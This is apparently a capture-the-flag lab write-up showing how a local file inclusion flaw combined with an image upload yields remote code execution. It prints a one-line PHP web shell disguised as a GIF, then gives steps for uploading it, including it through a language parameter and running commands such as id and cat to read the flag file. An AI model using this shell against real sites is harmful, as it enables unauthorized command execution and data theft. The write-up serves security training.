# LFI and File Uploads

#### Use any of the techniques covered in this section to gain RCE and read the flag at /

**Step 1** - Create a Malicious Image:

* Create a malicious GIF file:
  * ```bash
    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    ```

**Step 2** - Upload the file to the application:

* Access Profile Settings to upload the file:

<figure><img src="../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

* Check the file path to edit the URL:

<figure><img src="../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Access the web shell:

* Go to languages and paste the image path like shown bellow:
  * Image path with id command `./profile_images/shell.gif&cmd=id`

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

**Step 4** - Get the flag:

* Look for the flag wih `./profile_images/shell.gif&cmd=cat ../../../2f40d853e2d4768d87da1c81772bae0a.txt`:

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

And we got the flag!
